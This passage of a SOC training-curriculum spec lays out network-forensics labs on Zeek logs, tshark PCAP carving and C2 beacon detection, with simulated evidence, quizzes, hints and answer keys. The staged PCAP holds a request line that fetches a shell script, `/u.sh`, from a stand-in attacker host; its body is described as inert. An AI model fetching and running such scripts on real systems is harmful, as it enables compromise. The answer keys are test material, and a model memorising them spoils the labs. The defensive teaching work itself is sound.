  - `meta.json`: `{id:"L2.3", type:"DECODE", objective:"Read HTTP request lines and TLS SNI from zeek
    http.log/ssl.log; know which fields encryption hides and which survive", gate:false, est_minutes:15}`
  - `quiz.json`:
    1. (choice) "A host makes an HTTPS connection to a C2. Which field still tells you the destination
       hostname?" a) http.uri b) ssl `server_name` (SNI) c) the response body d) none — TLS hides
       everything → **b**
    2. (choice) "A `404` in http.log means:" a) the request was blocked b) the server had no such
       resource — common and usually benign c) malware d) a redirect → **b**
    3. (choice) "`user_agent: Mozilla/5.0 (WindowsPowerShell/5.1)` on an outbound request is worth a
       look because:" a) it's a browser b) it advertises a scripting engine making web requests — not a
       person browsing c) all Mozilla UAs are malicious d) it's a 404 → **b**
  - `hints.json`: L1 "http.log shows method/host/uri/user_agent/status — read it like a request line.
    ssl.log shows `server_name`, the SNI." L2 "The `/u.sh` pull is plaintext HTTP so you see the URI;
    the C2 session is TLS so you only get SNI. The odd user-agent names a scripting engine." L3 "q1
    200; q2 c2.stonewick[.]example (defanged, first ssl row); q3 the WindowsPowerShell UA; q4 POST;
    q5 the resumed row's server_name is `-`; q6 ssl."
  - `recap.md` (3 lines): `HTTP is readable: method, host, uri, user-agent, and status code are all in
    the clear — status 3xx redirects and 4xx not-founds are routine, not verdicts.` / `HTTPS hides the
    uri and body; the SNI (server_name in ssl.log) is the destination hostname you still get — until a
    resumed session drops it.` / `User-agents lie easily, but one advertising a scripting engine
    (curl, WindowsPowerShell) on outbound traffic is a cheap, useful tell.`
  - No `recall.json`.
  - **`## SECURITY ONION (OPTIONAL)`** appendix: not applicable to L2.3 (per D4, SO overlays land on
    L2.4/L2.5/L2.7). Omitted here.

**EVIDENCE SPEC**
```yaml
scenario: s2-http-tls                # tools/genevidence/s2-http-tls.yaml
lab: L2.3
window: {start: 2026-03-11T15:45:00Z, end: 2026-03-12T20:20:00Z}
hosts: {WEB01: 10.20.10.20, WKS-ACCT-07: 10.20.30.107, WKS-HD-03: 10.20.30.103}
externals: {webmail: 192.0.2.60, updates: 192.0.2.61, c2: 203.0.113.66, payload: 198.51.100.23}
attacker: {c2_host: c2.stonewick.example, payload_host: cdn.stonewick.example,
           cradle_ua: "Mozilla/5.0 (WindowsPowerShell/5.1)"}
benign_background:
  - {kind: web_browse, host: 10.20.30.103, dst: updates.example, rows: [GET 200, GET 301, GET 404]}
  - {kind: tls_webmail, host: 10.20.30.107, dst: 192.0.2.60, sni: saas.mail.example}
attacker_actions:
  - {t: 2026-03-12T20:16:00Z, kind: http_get, host: 10.20.10.20, dst: cdn.stonewick.example,
     uri: /u.sh, ua: curl/7.81.0, status: 200, id: CM-0312-0520}
  - {t: 2026-03-11T15:46:05Z, kind: http_post, host: 10.20.30.107, dst: updates.example,
     uri: /telemetry, ua: "Mozilla/5.0 (WindowsPowerShell/5.1)", status: 200}
  - {t: 2026-03-11T15:46:02Z, kind: tls, host: 10.20.30.107, dst: 203.0.113.66,
     sni: c2.stonewick.example, resumed: F, id: CM-0311-0502}
  - {t: 2026-03-11T15:51:02Z, kind: tls, host: 10.20.30.107, dst: 203.0.113.66, sni: '-', resumed: T}
emit: {http_log: files/http.log, ssl_log: files/ssl.log, answers_template: files/answers.template.txt}
answer_key:
  q1: "200"
  q2: c2.stonewick[.]example          # DEFANGED
  q3: "mozilla/5.0 (windowspowershell/5.1)"
  q4: post
  q5: "-"
  q6: ssl
verify:
  - the first (resumed=F) ssl row for 203.0.113.66 carries server_name c2.stonewick.example
  - a resumed=T ssl row exists with server_name '-'; http /u.sh row is plaintext (port 80)
```

---

### L2.4 — `tshark` first contact — carving answers out of a PCAP from the command line

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L2.4 | `tshark` first contact — carving answers out of a PCAP from the command line | GUIDED | false | 15 |

Dir `tracks/soc/phases/p2/L2.4-tshark-pcap/`. **One concept:** a PCAP is queryable from the shell —
`tshark -r file -Y <display filter> -T fields -e <field>` pulls exactly the fact you need, and
`-z follow,tcp,ascii,<n>` reassembles a stream. Grades produced tshark outputs (GUIDED, per D3).

**TEACHING ARTIFACT**
- **Files staged** (`files/`; the pcap from the `http_pcap` emitter, `s2-tshark-pcap`, RAW):
  - `capture.pcap` — scapy-built, ~18 packets, `t0 2026-03-12T20:16:00Z`, +Δ deterministic:
    1. DNS A query `cdn.stonewick.example` from `10.20.10.20` → `10.20.10.5:53`, and the response
       `A 198.51.100.23`.
    2. TCP 3-way handshake `10.20.10.20:44601 → 198.51.100.23:80`.
    3. `GET /u.sh HTTP/1.1\r\nHost: cdn.stonewick.example\r\nUser-Agent: curl/7.81.0\r\n\r\n`.
    4. `HTTP/1.1 200 OK` + a short readable body (`#!/bin/sh` + a benign-looking one-liner that is an
       **inert simulacrum** — a comment, not a working payload; nothing live-hostile).
    5. FIN/ACK teardown.
  - `answers.template.txt` — carved-fact answers.
- **Learner task (GUIDED STEPS, run for real; outputs captured to files that check.sh grades):**
  1. `tshark -r capture.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | sort -u > dns_q.txt`
  2. `tshark -r capture.pcap -Y 'dns.flags.response==1' -T fields -e dns.a | sort -u > dns_a.txt`
  3. `tshark -r capture.pcap -Y http.request -T fields -e http.request.method -e http.host -e http.request.uri > http_req.txt`
  4. `tshark -r capture.pcap -Y http.request -T fields -e http.user_agent > http_ua.txt`
  5. `tshark -r capture.pcap -Y 'http.response' -T fields -e http.response.code > http_status.txt`
  6. `cp answers.template.txt answers.txt` and fill from the outputs:
     ```
     q1=   # qname the client resolved (DEFANGED)                 -> cdn.stonewick[.]example
     q2=   # IP it resolved to (DEFANGED)                          -> 198.51.100[.]23
     q3=   # HTTP method + URI, space-joined, lowercased           -> get /u.sh
     q4=   # user-agent of the request (lowercased)                -> curl/7.81.0
     q5=   # HTTP status code returned                             -> 200
     ```
  7. OPTIONAL, UNGRADED: `tshark -r capture.pcap -z follow,tcp,ascii,0` to see the reassembled stream.
- **Grading** (`check.sh`, §2.1 + produced-artifact checks):
  1. `assert_file_exists dns_q.txt`; `dns_a.txt`; `http_req.txt`; `http_status.txt`; `answers.txt`
     (proves the tshark steps were actually run, L0.1-style).
  2. `assert_file_contains_fixed dns_a.txt "198.51.100.23"` (the produced tshark output is RAW/fanged —
     it's tool output, not learner prose, so it is NOT defanged; contrast with answers.txt q2 which IS).
  3. `assert_file_contains_fixed http_req.txt "/u.sh"`.
  4. normalize `answers.txt` → `.answers.norm`; anchored checks q1..q5 from decoded keys (q1/q2
     defanged, bracket-escaped).
  5. `ck_summary` last.
- **Kit files:**
  - `meta.json`: `{id:"L2.4", type:"GUIDED", objective:"Carve DNS, HTTP request, user-agent, and status
    facts out of a pcap with tshark field extraction, and follow a TCP stream", gate:false,
    est_minutes:15}`
  - `quiz.json`:
    1. (choice) "`tshark -r f.pcap -T fields -e http.host` does what?" a) captures live traffic b) reads
       a saved pcap and prints the http.host field of matching packets c) needs root d) decrypts TLS →
       **b**
    2. (choice) "Why can tshark show you `GET /u.sh` here but not the URI of the C2 session in L2.3?"
       a) tshark can't read GET b) the /u.sh fetch is plaintext HTTP; the C2 session is TLS-encrypted
       c) the pcap is corrupt d) URIs are always hidden → **b**
    3. (text) "Which tshark option reassembles and prints a full TCP conversation as text? (the
       `-z follow,tcp,ascii,<n>` form — answer the single letter flag)" → **key `-z`** (accept `z`)
  - `hints.json`: L1 "Every answer is one `tshark -r capture.pcap -T fields -e <field>` away; add
    `-Y <filter>` to pick the right packets (e.g. `-Y http.request`)." L2 "DNS: `dns.qry.name` for the
    question, `dns.a` for the answer. HTTP: `http.request.method`, `http.host`, `http.request.uri`,
    `http.user_agent`, `http.response.code`. Your answers.txt IOCs must be defanged even though the
    tool output isn't." L3 "q1 cdn.stonewick[.]example; q2 198.51.100[.]23; q3 get /u.sh; q4
    curl/7.81.0; q5 200."
  - `recap.md` (3 lines): `A pcap is queryable from the shell: tshark -r file -Y <filter> -T fields -e
    <field> pulls exactly one fact per column.` / `Plaintext HTTP exposes method, host, uri, and
    user-agent; TLS would leave you only the SNI — the same lesson as the logs.` / `-z follow,tcp
    reassembles a whole conversation, turning scattered packets back into the request and response you
    can read.`
  - No `recall.json`.
  - **`## SECURITY ONION (OPTIONAL)`**: "The same pcap can be uploaded to `cardinal-so` and pivoted in
    the PCAP/Zeek view of the Hunt UI; the tshark path above is the graded one — the VM is optional and
    nothing here checks for it."

**EVIDENCE SPEC**
```yaml
scenario: s2-tshark-pcap             # tools/genevidence/s2-tshark-pcap.yaml
lab: L2.4
window: {start: 2026-03-12T20:16:00Z, end: 2026-03-12T20:16:30Z}
hosts: {WEB01: 10.20.10.20, DC01: 10.20.10.5}
externals: {payload: 198.51.100.23}
attacker: {payload_host: cdn.stonewick.example}
attacker_actions:
  - {t0: 2026-03-12T20:16:00Z, kind: dns+http_get, client: 10.20.10.20, resolver: 10.20.10.5,
     qname: cdn.stonewick.example, answer: 198.51.100.23, method: GET, uri: /u.sh,
     ua: curl/7.81.0, status: 200, body: "#!/bin/sh  (inert simulacrum, single comment line)",
     id: CM-0312-0520}
emit:
  pcap: files/capture.pcap                     # scapy http_pcap, ~18 packets, deterministic timing
  answers_template: files/answers.template.txt
answer_key:
  q1: cdn.stonewick[.]example                  # DEFANGED in answers.txt
  q2: 198.51.100[.]23                          # DEFANGED in answers.txt
  q3: get /u.sh
  q4: curl/7.81.0
  q5: "200"
verify:
  - pcap qname == answer_key host (defanged form matches raw when unbracketed)
  - pcap body is a static inert simulacrum (no network calls, no real payload)
```

---

### L2.5 — Zeek logs — `conn`, `dns`, `http`, and the fields that carry the verdict

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L2.5 | Zeek logs — `conn`, `dns`, `http`, and the fields that carry the verdict | DECODE | false | 15 |

Dir `tracks/soc/phases/p2/L2.5-zeek-verdict/`. **One concept:** the **`uid` is the join key** — one
connection appears across `conn`/`dns`/`http`/`ssl`, and stitching them by `uid` reconstructs the
whole conversation; each log contributes the one field that carries the verdict.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s2-zeek-verdict`, RAW; **all four logs share uids** —
  `verify.py` uid-consistency gate applies):
  - `conn.log` — 5 rows incl. the M2 beacon `10.20.30.107 → 203.0.113.66:443 ssl SF` (`uid=CXbeac1`,
    `CM-0311-0501`) and the WEB01 `/u.sh` pull `10.20.10.20 → 198.51.100.23:80 http SF`
    (`uid=CXush1`, `CM-0312-0520`); plus benign webmail, dns, ntp rows.
  - `dns.log` — 3 rows; one is the M2 pre-beacon resolve `A c2.stonewick.example → 203.0.113.66`
    (`uid=CXdns1`, `CM-0311-0500`), which **shares no conn uid** (dns is its own connection) but whose
    `answers` field (203.0.113.66) is the pivot into the beacon conn row's `id.resp_h`.
  - `http.log` — 1 row: the `/u.sh` pull, **`uid=CXush1`** (same uid as its conn row) — the teaching
    moment: same uid, two logs, one conversation.
  - `ssl.log` — 1 row: the beacon TLS, **`uid=CXbeac1`** (same uid as the beacon conn row),
    `server_name c2.stonewick.example` (`CM-0311-0502`).
  - `answers.template.txt`.
- **Learner task:** pivot by uid and by resolved IP; answer. Template + grammar:
  ```
  q1=   # the uid shared by the /u.sh conn row and its http row                 -> cxush1
  q2=   # in ssl.log, the field name that carries the C2 destination hostname   -> server_name
  q3=   # the dns answers value that the beacon conn row's id.resp_h matches
        #   (DEFANGED)                                                           -> 203.0.113[.]66
  q4=   # which log tells you HOW a connection ended (conn_state lives there)    -> conn
  q5=   # the event_id of the ssl row for the beacon (cm-mmdd-nnnn)              -> cm-0311-0502
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; anchored checks; q3 defanged (bracket-escape);
  `ck_summary` last. `verify.py` gate: `CXush1` appears in both conn.log and http.log with the same
  5-tuple; `CXbeac1` appears in both conn.log and ssl.log.
- **Kit files:**
  - `meta.json`: `{id:"L2.5", type:"DECODE", objective:"Join zeek conn/dns/http/ssl by uid and by
    resolved IP to reconstruct one conversation, and name the field in each log that carries the
    verdict", gate:false, est_minutes:15}`
  - `quiz.json`:
    1. (choice) "What is a zeek `uid`?" a) a user id b) a per-connection identifier shared across every
       zeek log for that connection c) an event severity d) a rule id → **b**
    2. (choice) "You have a beacon's conn row but want the destination hostname. Which log + field?"
       a) conn `service` b) ssl `server_name` via the shared uid c) dns `query` always d) http `host`
       → **b**
    3. (choice) "conn.log gives duration and conn_state; dns.log gives query/answers; http.log gives
       method/uri/UA. Why keep them separate then join by uid?" a) disk space b) each log carries a
       different slice of one conversation — uid stitches them back together c) they're redundant d)
       zeek requires it → **b**
  - `hints.json`: L1 "Find the same uid in two logs — that's one conversation seen twice. `grep` the uid
    across files." L2 "The /u.sh conn row and its http row share a uid; the beacon conn row and its ssl
    row share a different uid. dns.log doesn't share those uids, but its `answers` IP matches the
    beacon's `id.resp_h`." L3 "q1 cxush1; q2 server_name; q3 203.0.113[.]66; q4 conn; q5 the beacon
    ssl row's event_id cm-0311-0502."
  - `recap.md` (3 lines): `Zeek splits one conversation across logs — conn, dns, http, ssl — and the
    uid is the key that joins them back into a single story.` / `Each log carries a different verdict
    field: conn has conn_state and bytes, dns has query/answers, http has uri/UA, ssl has server_name.`
    / `When a uid isn't shared (dns is its own connection), pivot on the value instead — a resolved IP
    links the lookup to the session that used it.`
  - No `recall.json`.
  - **`## SECURITY ONION (OPTIONAL)`**: "In `cardinal-so`, these same zeek logs are the Hunt UI's
    correlation view; clicking a connection pivots by uid automatically. The flat-file `grep`/`jq` path
    above is the graded one."

**EVIDENCE SPEC**
```yaml
scenario: s2-zeek-verdict            # tools/genevidence/s2-zeek-verdict.yaml
lab: L2.5
window: {start: 2026-03-11T15:45:00Z, end: 2026-03-12T20:20:00Z}
hosts: {WEB01: 10.20.10.20, WKS-ACCT-07: 10.20.30.107, DC01: 10.20.10.5}
externals: {webmail: 192.0.2.60, ntp: 192.0.2.10, c2: 203.0.113.66, payload: 198.51.100.23}
attacker: {c2_host: c2.stonewick.example, payload_host: cdn.stonewick.example}
uids: {beacon: CXbeac1, ush: CXush1, c2dns: CXdns1}   # shared across logs — verify.py enforces
attacker_actions:
  - {t: 2026-03-11T15:45:58Z, log: dns, uid: CXdns1, query: c2.stonewick.example, answers: 203.0.113.66, id: CM-0311-0500}
  - {t: 2026-03-11T15:46:02Z, log: conn, uid: CXbeac1, tuple: 10.20.30.107->203.0.113.66:443, service: ssl, state: SF, id: CM-0311-0501}
  - {t: 2026-03-11T15:46:02Z, log: ssl,  uid: CXbeac1, server_name: c2.stonewick.example, id: CM-0311-0502}
  - {t: 2026-03-12T20:16:00Z, log: conn, uid: CXush1, tuple: 10.20.10.20->198.51.100.23:80, service: http, state: SF, id: CM-0312-0520}
  - {t: 2026-03-12T20:16:00Z, log: http, uid: CXush1, method: GET, host: cdn.stonewick.example, uri: /u.sh, id: CM-0312-0520}
emit: {conn_log: files/conn.log, dns_log: files/dns.log, http_log: files/http.log, ssl_log: files/ssl.log,
       answers_template: files/answers.template.txt}
answer_key:
  q1: cxush1
  q2: server_name
  q3: 203.0.113[.]66                 # DEFANGED
  q4: conn
  q5: cm-0311-0502
verify:
  - CXush1 in {conn.log, http.log} with identical 5-tuple; CXbeac1 in {conn.log, ssl.log}
  - dns answers 203.0.113.66 equals the beacon conn id.resp_h (pivot-by-value works)
```

---

### L2.6 — Beaconing — periodicity, jitter, and C2 shapes in connection logs

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L2.6 | Beaconing — periodicity, jitter, and C2 shapes in connection logs | HUNT | false | 20 |

Dir `tracks/soc/phases/p2/L2.6-beaconing/`. **One concept:** beacon math — compute inter-arrival
deltas per destination, recognize a near-fixed period with small jitter as automation, and separate
the *hostile* periodic signal from *benign* periodic signals (NTP, a webmail poll). The map's job
hook: "machine caught it, human confirms it."

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s2-beaconing`, RAW; **one conn.log holds all three periodic
  signals** per §3.5):
  - `conn.log` — zeek TSV, ~50 rows over `2026-03-11T15:46:00Z … 17:16:00Z` (90 min):
    - **M2 C2 beacon:** `10.20.30.107 → 203.0.113.66:443 ssl`, base period **300s ± ~10% seeded
      jitter**, ~18 rows, tiny symmetric bytes (~500/~1200), all SF. First row `CM-0311-0501`.
    - **benign NTP:** `10.20.30.103 → 192.0.2.10:123 udp`, fixed **64s**, ~84 rows folded to a
      representative sample, 76/76 bytes (the "too-regular, known port" false beacon).
    - **benign webmail poll:** `10.20.30.107 → 192.0.2.60:443 ssl`, **900s**, larger varying bytes
      (human-ish, boring).
    - a little non-periodic web noise for realism.
  - `beacon-method.md` — static: the delta method (`sort by ts`, `awk` successive-`ts` differences per
    dst), what jitter is (deviation around a base period), why known-service ports (123 NTP) and large
    varying transfers argue *benign*.
  - `answers.template.txt`.
- **Learner task:** group by dst, compute deltas, judge shape. Template + grammar:
  ```
  q1=   # the beaconing host — DEFANGED                                        -> 10.20.30[.]107
  q2=   # the hostile beacon's destination IP — DEFANGED                        -> 203.0.113[.]66
  q3=   # approximate base period of the hostile beacon, seconds (integer)      -> 300
  q4=   # number of hostile beacon connections in the log                       -> <generator int>
  q5=   # the destination IP that is ALSO periodic but BENIGN — DEFANGED        -> 192.0.2[.]10
  q6=   # one word: why q5 is benign despite being periodic (port|service)      -> ntp
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; anchored checks; q1/q2/q5 defanged
  (bracket-escape); **q4 is the generator-emitted beacon-row count** (`verify.py` asserts
  `q4 == len(beacon_rows)`, per §3.5 off-by-one fix); q6 accepts `ntp` (decoded key) — a single token;
  `ck_summary` last.
- **Kit files:**
  - `meta.json`: `{id:"L2.6", type:"HUNT", objective:"Find a jittered C2 beacon by computing
    inter-arrival deltas per destination and separate it from benign periodic traffic (NTP, polls)",
    gate:false, est_minutes:20}`
  - `quiz.json`:
    1. (choice) "What is jitter in a beacon?" a) packet loss b) deliberate small random variation
       around a base callback interval to evade fixed-interval detection c) a port number d) a TLS
       version → **b**
    2. (choice) "Traffic to `192.0.2.10:123/udp` every 64s is periodic. Why is it usually NOT C2?" a)
       64s is too fast b) UDP can't carry C2 c) 123/udp is NTP — a known, expected periodic service d)
       it isn't encrypted → **c**
    3. (choice) "Your platform flags a 300s ±10% callback to an external IP. As the Tier 1 human, you
       confirm it by:" a) trusting the flag and escalating blind b) computing the deltas yourself and
       checking the destination, port, and byte pattern before you write the verdict c) closing it as
       FP because it's automated d) ignoring jitter → **b**
  - `hints.json`: L1 "Group connections by destination IP, sort by ts, and look at the gaps between
    successive connections to the same dst." L2 "One external dst repeats every ~300s with small
    variation and tiny transfers — that's the beacon. NTP (123/udp) also repeats but is a known
    service; the webmail poll is periodic but moves real, varying bytes." L3 "q1 10.20.30[.]107; q2
    203.0.113[.]66; q3 300; q4 = count the beacon rows; q5 192.0.2[.]10; q6 ntp."
  - `recap.md` (3 lines): `Beaconing is automation's fingerprint: near-fixed callback intervals with
    small jitter, tiny symmetric transfers, to one external destination.` / `Compute the deltas
    yourself — group by destination, diff successive timestamps — because periodic is not the same as
    hostile.` / `NTP and app polls are periodic and benign; the machine surfaces the shape, but the
    human confirms destination, port, and byte pattern before the verdict.`
  - No `recall.json`.
  - **`## SECURITY ONION (OPTIONAL)`**: not applied to L2.6 (D4 selects L2.4/L2.5/L2.7). Omitted.

**EVIDENCE SPEC**
```yaml
scenario: s2-beaconing               # tools/genevidence/s2-beaconing.yaml
lab: L2.6
window: {start: 2026-03-11T15:46:00Z, end: 2026-03-11T17:16:00Z}
hosts: {WKS-ACCT-07: 10.20.30.107, WKS-HD-03: 10.20.30.103}
externals: {c2: 203.0.113.66, ntp: 192.0.2.10, webmail: 192.0.2.60}
beacon_series:                       # deterministic seeded jitter (fixed offset list, no random at emit)
  - {name: c2_beacon, src: 10.20.30.107, dst: 203.0.113.66:443, base_period_s: 300, jitter_pct: 10,
     bytes: {orig: ~500, resp: ~1200}, first_id: CM-0311-0501, hostile: true}
  - {name: ntp,      src: 10.20.30.103, dst: 192.0.2.10:123,  base_period_s: 64,  jitter_pct: 0,
     bytes: {orig: 76, resp: 76}, hostile: false}
  - {name: webmail,  src: 10.20.30.107, dst: 192.0.2.60:443,  base_period_s: 900, jitter_pct: 5,
     bytes: {orig: varying, resp: varying}, hostile: false}
emit: {conn_log: files/conn.log, method_card: files/beacon-method.md, answers_template: files/answers.template.txt}
answer_key:
  q1: 10.20.30[.]107                 # DEFANGED
  q2: 203.0.113[.]66                 # DEFANGED
  q3: "300"
  q4: "<c2_beacon_row_count>"        # generator-emitted; verify.py asserts == len(c2_beacon rows)
  q5: 192.0.2[.]10                   # DEFANGED
  q6: ntp
verify:
  - all three periodic signals present in one conn.log; q4 equals emitted c2_beacon row count exactly
  - c2_beacon deltas fall within base_period_s ± jitter_pct; ntp deltas fixed at 64s
```

---

### L2.7 — Phase gate: one PCAP + Zeek bundle — reconstruct the full session story

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L2.7 | Phase gate: one PCAP + Zeek bundle — reconstruct the full session story | HUNT | true | 20 |

Dir `tracks/soc/phases/p2/L2.7-gate-session-story/`. **Integrative:** the same intrusion given as a
**pcap AND a zeek bundle**, so the learner corroborates one story across two evidence forms — the
network analog of L1.2's "one instant, many spellings." Every Phase 2 skill is exercised: conn
reading, DNS hunt, HTTP/TLS visibility, tshark carving, uid joins, beacon math.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s2-gate-session`, RAW; pcap↔zeek agreement enforced by
  `verify.py`):
  - `zeek/conn.log`, `zeek/dns.log`, `zeek/http.log`, `zeek/ssl.log` — the M2/M3 network story on
    2026-03-11 → 03-12: pre-beacon DNS resolve of `c2.stonewick.example` (`CM-0311-0500`), the 300s±10%
    TLS beacon to `203.0.113.66` with SNI (`CM-0311-0501/0502`), the DNS-tunnel burst under
    `tun.stonewick.example` from WKS-ENG-12 (`CM-0312-0310/0311/0312`), and the WEB01 plaintext
    `GET /u.sh` from `cdn.stonewick.example` (`CM-0312-0520`). Benign webmail/NTP/scanner rows mixed in.
  - `capture.pcap` — scapy; the **DNS resolve + first TLS beacon** slice as packets (SNI visible in the
    ClientHello), so the learner can carve the same SNI from the pcap that the ssl.log shows — the two
    forms must agree.
  - `answers.template.txt` — a **story reconstruction** template (8 fields).
- **Learner task:** reconstruct the session. Read the zeek bundle, corroborate with `tshark` on the
  pcap, build the timeline. Template + grammar:
  ```
  # Reconstruct the C2 session. IOC answers DEFANGED; timestamps ISO-8601 UTC lowercase.
  q1=   # the C2 domain the victim resolved (DEFANGED)                          -> c2.stonewick[.]example
  q2=   # the C2 IP it resolved to (DEFANGED)                                    -> 203.0.113[.]66
  q3=   # the SNI seen in the first TLS handshake (DEFANGED)                      -> c2.stonewick[.]example
  q4=   # the beacon base period in seconds (integer)                            -> 300
  q5=   # the beaconing host — DEFANGED                                          -> 10.20.30[.]107
  q6=   # the tunneling host (different host) — DEFANGED                          -> 10.20.31[.]112
  q7=   # the plaintext payload URI pulled by WEB01                              -> /u.sh
  q8=   # event_id of the pre-beacon C2 DNS resolve (cm-mmdd-nnnn)               -> cm-0311-0500
  ```
- **Grading** (`check.sh`, §2.1, 8 anchored checks): presence + normalize; q1/q2/q3/q5/q6 defanged
  (bracket-escape); q4 integer; q7 literal path; q8 event id. `ck_summary` last. The gate quiz gates
  3/3 as usual. `verify.py` gate: every qname/host/IP in `capture.pcap` appears in the zeek bundle and
  vice-versa (pcap↔zeek agreement), and the beacon row count matches the beacon series length.
- **Kit files:**
  - `meta.json`: `{id:"L2.7", type:"HUNT", objective:"Reconstruct a C2 session's full story from a pcap
    and a zeek bundle together — resolve, beacon, tunnel, payload pull — corroborated across both
    evidence forms", gate:true, est_minutes:20}`
  - `quiz.json` (3, choice, gates 3/3):
    1. "The pcap's ClientHello SNI and ssl.log's server_name both read `c2.stonewick.example`. What has
       corroborating two evidence forms bought you?" a) nothing b) higher confidence the destination is
       real and not a log artifact c) it decrypts the session d) it proves malware → **b**
    2. "Two different hosts are involved: one beacons over TLS, one tunnels over DNS. Are they the same
       incident?" a) always b) not necessarily — reconstruct each host's story before merging them; the
       gate keys them separately (q5 vs q6) c) never d) can't tell → **b**
    3. "The WEB01 `/u.sh` pull is plaintext HTTP but the C2 callback is TLS. Which URI can you read
       directly, and which needs SNI?" a) both plaintext b) /u.sh is readable in http.log/pcap; the C2
       session gives only SNI c) neither d) both need SNI → **b**
  - `hints.json`: L1 "Build a timeline per host: what did WKS-ACCT-07 do, what did WKS-ENG-12 do, what
    did WEB01 do? Each has one thread of the story." L2 "Start from the C2 DNS resolve (dns.log
    `answers`), follow the uid into conn/ssl for the beacon, carve the same SNI from the pcap with
    tshark to confirm; the tunnel is a separate host's DNS burst; the payload pull is WEB01's plaintext
    http row." L3 "q1/q3 c2.stonewick[.]example; q2 203.0.113[.]66; q4 300; q5 10.20.30[.]107; q6
    10.20.31[.]112; q7 /u.sh; q8 cm-0311-0500."
  - `recap.md` (3 lines): `A full network story reads across logs and packets: DNS resolve → TLS beacon
    with SNI → payload pull → separate DNS tunnel, each grounded in a uid and an event id.` / `Two
    evidence forms that agree — pcap SNI and ssl.log server_name — raise confidence; one without the
    other leaves room for doubt.` / `Phase 2 complete: you can read a conn.log like a sentence, hunt a
    DNS tunnel, tell HTTP from TLS visibility, carve a pcap, join zeek by uid, and confirm a beacon by
    hand — Phase 3 turns to the endpoint.`
  - **`recall.json`: none in this lab** (not a phase opener). **Parked draft for L3.1** (drafted now per
    Phase Builder step 6, lifted verbatim at the p3 build; **[VERIFY-AT-BUILD]** against built Phase 2
    content):
    1. (choice) "In a zeek `conn.log` row, `conn_state SF` means?" a) no reply seen b) normal
       establishment and teardown c) rejected → **key b** — source **L2.1**.
    2. (text) "A host firing hundreds of long random subdomains under one zone with heavy NXDOMAIN is
       doing what? (one word)" → **key `tunneling`** (accept `tunnel`, `exfiltration`) — source **L2.2**.
    3. (text) "Regular ~300s callbacks with small jitter to one external IP are called ___ (one word)."
       → **key `beaconing`** (accept `beacon`) — source **L2.6**.
    4. (text) "HTTPS hides the URI; which TLS field still reveals the destination hostname? (one word,
       the zeek field name or its acronym)" → **key `sni`** (accept `server_name`) — source **L2.3**.
    5. (text) "Which zeek field joins one connection across conn.log, dns.log, http.log, and ssl.log?"
       → **key `uid`** — source **L2.5**.
  - **`## SECURITY ONION (OPTIONAL)`**: "Upload `capture.pcap` to `cardinal-so` and walk the same
    reconstruction in the Hunt UI (Zeek + PCAP pivots). This is a console rep only — the flat-file
    answers above are the graded gate and the VM is never required."

**EVIDENCE SPEC**
```yaml
scenario: s2-gate-session            # tools/genevidence/s2-gate-session.yaml
lab: L2.7
window: {start: 2026-03-11T15:45:00Z, end: 2026-03-12T20:20:00Z}
hosts: {WEB01: 10.20.10.20, WKS-ACCT-07: 10.20.30.107, WKS-ENG-12: 10.20.31.112, DC01: 10.20.10.5}
externals: {webmail: 192.0.2.60, ntp: 192.0.2.10, scanner: 192.0.2.199,
            c2: 203.0.113.66, payload: 198.51.100.23}
attacker: {c2_host: c2.stonewick.example, payload_host: cdn.stonewick.example, tunnel_zone: tun.stonewick.example}
attacker_actions:
  - {t: 2026-03-11T15:45:58Z, log: dns, host: WKS-ACCT-07, query: c2.stonewick.example, answers: 203.0.113.66, id: CM-0311-0500}
  - {t: 2026-03-11T15:46:02Z+, log: [conn, ssl], host: WKS-ACCT-07, dst: 203.0.113.66:443,
     sni: c2.stonewick.example, period_s: 300, jitter_pct: 10, id: [CM-0311-0501, CM-0311-0502]}
  - {t: 2026-03-12T09:00:00Z+, log: dns, host: WKS-ENG-12, zone: tun.stonewick.example,
     qtype: TXT, rcode: NXDOMAIN, id: [CM-0312-0310, CM-0312-0311, CM-0312-0312]}
  - {t: 2026-03-12T20:16:00Z, log: [conn, http], host: WEB01, dst: cdn.stonewick.example, uri: /u.sh, id: CM-0312-0520}
emit:
  zeek_bundle: [files/zeek/conn.log, files/zeek/dns.log, files/zeek/http.log, files/zeek/ssl.log]
  pcap: files/capture.pcap             # DNS resolve + first TLS beacon (SNI visible)
  answers_template: files/answers.template.txt
  key_block: check.sh                   # base64 KEY_Q1..Q8
answer_key:
  q1: c2.stonewick[.]example           # DEFANGED
  q2: 203.0.113[.]66                   # DEFANGED
  q3: c2.stonewick[.]example           # DEFANGED (SNI)
  q4: "300"
  q5: 10.20.30[.]107                   # DEFANGED
  q6: 10.20.31[.]112                   # DEFANGED
  q7: /u.sh
  q8: cm-0311-0500
verify:
  - pcap↔zeek agreement: every qname/host/IP in capture.pcap is in the zeek bundle and vice-versa
  - beacon row count == beacon series length; SNI in pcap ClientHello == ssl.log server_name
  - all ids present in emitted evidence; prose defanged, raw evidence not
```

---

## 5. Build order (one session, Phase Builder protocol)

Prerequisite: `soc-p0` + `soc-p1` tagged (the generator core and universe must exist on disk).

1. **Generator extensions** — add `zeek_http_tsv`, `zeek_ssl_tsv`, `http_pcap`, `beacon_conn_series`
   emitters + the three new `verify.py` invariants; self-test each against a throwaway scenario. Append
   the §2.1 canonical-id additions to `tools/genevidence/universe-events.yaml`.
2. **p2 scenarios** in map order — `s2-conn-reading`, `s2-dns-hunt`, `s2-http-tls`, `s2-tshark-pcap`,
   `s2-zeek-verdict`, `s2-beaconing`, `s2-gate-session` → L2.1…L2.7. Build lab by lab using the §2.1
   canonical grading pattern verbatim; self-test each (fail path with wrong/missing answers → useful
   message; pass path with real captured outputs pasted into lab.md), commit per lab
   (`soc L2.x: <title>`), one branch+PR+merge per lab per the standing git-workflow loop.
3. **Gate (L2.7)** integrates the phase and drafts L3.1's recall (already parked above); time L2.2/L2.6/
   L2.7 honestly against the 20-min ceiling and trim guided steps if tight (HUNT labs are the pacing
   risk).
